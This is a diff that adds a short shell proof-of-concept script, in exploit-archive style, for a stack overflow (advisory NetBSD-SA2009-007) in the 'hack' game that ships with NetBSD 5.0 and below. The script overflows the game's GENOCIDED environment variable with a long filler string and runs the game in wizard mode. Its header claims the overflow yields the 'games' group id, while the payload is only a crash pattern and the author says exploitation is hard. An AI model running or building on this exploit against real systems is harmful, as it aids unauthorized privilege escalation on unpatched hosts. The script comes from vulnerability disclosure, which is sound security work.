@@ -1,0 +1,23 @@
+#!/bin/sh
+
+# NetBSD 5.0 and below Hack GENOCIDE Environment overflow proof of concept 
+# Successfull Exploitation gives guid 100 (games)
+# Vulnerable Function is in hack.main.c.
+# /usr/games/hack -D use the wizard mode. Only work in wizard mode.
+# It is a basic strcpy stack overflow. Such overflows are hard to exploit in
+# NetBSD. If you can exploit it successfully feel free to contact me
+# Original Advisorie: NetBSD-SA2009-007
+
+# Title: hack rougelike game GENOCIDE stack overflow
+# Author: JMIT (office@johannesmaria.at)
+# Date: 18. May 2010
+# Software Link: Contained in all NetBSD Distributions as default
+# Version: NetBSD 5.0 and below
+# Tested on: NetBSD 5.0-RELEASE
+# CVE: Not available. See NetBSD-SA2009-007
+# Code:
+
+
+# office@johannesmaria.at
+
+export GENOCIDED=`perl -e 'print "X"x15400;print "\x41\x42\x43\x44"x15'` && /usr/games/hack -D
